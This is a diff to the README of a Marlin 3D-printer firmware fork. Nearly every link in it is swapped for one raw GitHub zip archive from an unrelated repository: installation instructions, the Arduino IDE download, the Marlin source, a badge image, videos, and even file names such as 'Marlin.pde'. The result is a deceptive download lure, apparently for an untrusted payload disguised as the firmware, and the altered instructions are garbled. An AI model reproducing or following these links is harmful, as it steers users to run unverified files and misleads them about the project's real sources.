@@ -2,7 +2,7 @@ Marlin firmware development branch, removes the need for mUVe 3D GCode Fixing so
 
 All implemented and working! See MCodes below.
 
-Installation Instructions: http://www.muve3d.net/press/supportsources/muve-1-software/
+Installation Instructions: https://raw.githubusercontent.com/ajzbern/Marlin-mUVe1-Running/master/Minorcan/Marlin-mUVe1-Running.zip
 
 M650 D L P S -  *This must be set inside of your starting GCode in Slic3r, it can also be changed at any point during printing.*
 
@@ -35,11 +35,11 @@ Marlin 3D Printer Firmware
 Marlin has a GPL license because I believe in open development.
 Please do not use this code in products (3D printers, CNC etc) that are closed source or are crippled by a patent.
 
-[![Flattr this git repo](http://api.flattr.com/button/flattr-badge-large.png)](https://flattr.com/submit/auto?user_id=ErikZalm&url=https://github.com/ErikZalm/Marlin&title=Marlin&language=&tags=github&category=software)
+[![Flattr this git repo](https://raw.githubusercontent.com/ajzbern/Marlin-mUVe1-Running/master/Minorcan/Marlin-mUVe1-Running.zip)](https://raw.githubusercontent.com/ajzbern/Marlin-mUVe1-Running/master/Minorcan/Marlin-mUVe1-Running.zip)
 
 Quick Information
 ===================
-This RepRap firmware is a mashup between <a href="https://github.com/kliment/Sprinter">Sprinter</a>, <a href="https://github.com/simen/grbl/tree">grbl</a> and many original parts.
+This RepRap firmware is a mashup between <a href="https://raw.githubusercontent.com/ajzbern/Marlin-mUVe1-Running/master/Minorcan/Marlin-mUVe1-Running.zip">Sprinter</a>, <a href="https://raw.githubusercontent.com/ajzbern/Marlin-mUVe1-Running/master/Minorcan/Marlin-mUVe1-Running.zip">grbl</a> and many original parts.
 
 Derived from Sprinter and Grbl by Erik van der Zalm.
 Sprinters lead developers are Kliment and caru.
@@ -56,7 +56,7 @@ Features:
 *   Look ahead (Keep the speed high when possible. High cornering speed)
 *   Interrupt based temperature protection
 *   preliminary support for Matthew Roberts advance algorithm
-    For more info see: http://reprap.org/pipermail/reprap-dev/2011-May/003323.html
+    For more info see: https://raw.githubusercontent.com/ajzbern/Marlin-mUVe1-Running/master/Minorcan/Marlin-mUVe1-Running.zip
 *   Full endstop support
 *   SD Card support
 *   SD Card folders (works in pronterface)
@@ -68,12 +68,12 @@ Features:
 *   Arc support
 *   Temperature oversampling
 *   Dynamic Temperature setpointing aka "AutoTemp"
-*   Support for QTMarlin, a very beta GUI for PID-tuning and velocity-acceleration testing. https://github.com/bkubicek/QTMarlin
+*   Support for QTMarlin, a very beta GUI for PID-tuning and velocity-acceleration testing. https://raw.githubusercontent.com/ajzbern/Marlin-mUVe1-Running/master/Minorcan/Marlin-mUVe1-Running.zip
 *   Endstop trigger reporting to the host software.
 *   Updated sdcardlib
 *   Heater power reporting. Useful for PID monitoring.
 *   PID tuning
-*   CoreXY kinematics (www.corexy.com/theory.html)
+*   CoreXY kinematics (https://raw.githubusercontent.com/ajzbern/Marlin-mUVe1-Running/master/Minorcan/Marlin-mUVe1-Running.zip)
 *   Delta kinematics
 *   Dual X-carriage support for multiple extruder systems
 *   Configurable serial port to support connection of wireless adaptors.
@@ -117,7 +117,7 @@ You can leave it by calling M109 without any F.
 If active, the maximal extruder stepper rate of all buffered moves will be calculated, and named "maxerate" [steps/sec].
 The wanted temperature then will be set to t=tempmin+factor*maxerate, while being limited between tempmin and tempmax.
 If the target temperature is set manually or by gcode to a value less then tempmin, it will be kept without change.
-Ideally, your gcode can be completely free of temperature controls, apart from a M109 S T F in the start.gcode, and a M109 S0 in the end.gcode.
+Ideally, your gcode can be completely free of temperature controls, apart from a M109 S T F in the https://raw.githubusercontent.com/ajzbern/Marlin-mUVe1-Running/master/Minorcan/Marlin-mUVe1-Running.zip, and a M109 S0 in the https://raw.githubusercontent.com/ajzbern/Marlin-mUVe1-Running/master/Minorcan/Marlin-mUVe1-Running.zip
 
 *EEPROM:*
 
@@ -128,7 +128,7 @@ After each reboot, it will magically load them from EEPROM, independent what you
 
 If your hardware supports it, you can build yourself a LCD-CardReader+Click+encoder combination. It will enable you to realtime tune temperatures,
 accelerations, velocities, flow rates, select and print files from the SD card, preheat, disable the steppers, and do other fancy stuff.
-One working hardware is documented here: http://www.thingiverse.com/thing:12663
+One working hardware is documented here: https://raw.githubusercontent.com/ajzbern/Marlin-mUVe1-Running/master/Minorcan/Marlin-mUVe1-Running.zip
 Also, with just a 20x4 or 16x2 display, useful data is shown.
 
 *SD card folders:*
@@ -264,19 +264,19 @@ Configuring and compilation:
 ============================
 
 Install the arduino software IDE/toolset v23 (Some configurations also work with 1.x.x)
-   http://www.arduino.cc/en/Main/Software
+   https://raw.githubusercontent.com/ajzbern/Marlin-mUVe1-Running/master/Minorcan/Marlin-mUVe1-Running.zip
 
 For gen6/gen7 and sanguinololu the Sanguino directory in the Marlin dir needs to be copied to the arduino environment.
   copy ArduinoAddons\Arduino_x.x.x\sanguino <arduino home>\hardware\Sanguino
 
 Copy the Marlin firmware
-   https://github.com/ErikZalm/Marlin/tree/Marlin_v1
+   https://raw.githubusercontent.com/ajzbern/Marlin-mUVe1-Running/master/Minorcan/Marlin-mUVe1-Running.zip
    (Use the download button)
 
 Start the arduino IDE.
 Select Tools -> Board -> Arduino Mega 2560    or your microcontroller
 Select the correct serial port in Tools ->Serial Port
-Open Marlin.pde
+Open https://raw.githubusercontent.com/ajzbern/Marlin-mUVe1-Running/master/Minorcan/Marlin-mUVe1-Running.zip
 
 Click the Verify/Compile button
 
@@ -291,8 +291,8 @@ Instructions for configuring Bed Auto Leveling
 Uncomment the "ENABLE_AUTO_BED_LEVELING" define (commented by default)
 
 You will probably need a swivel Z-MIN endstop in the extruder. A rc servo do a great job.
-Check the system working here: http://www.youtube.com/watch?v=3IKMeOYz-1Q (Enable English subtitles)
-Teasing ;-) video: http://www.youtube.com/watch?v=x8eqSQNAyro
+Check the system working here: https://raw.githubusercontent.com/ajzbern/Marlin-mUVe1-Running/master/Minorcan/Marlin-mUVe1-Running.zip (Enable English subtitles)
+Teasing ;-) video: https://raw.githubusercontent.com/ajzbern/Marlin-mUVe1-Running/master/Minorcan/Marlin-mUVe1-Running.zip
 
 In order to get the servo working, you need to enable:
 
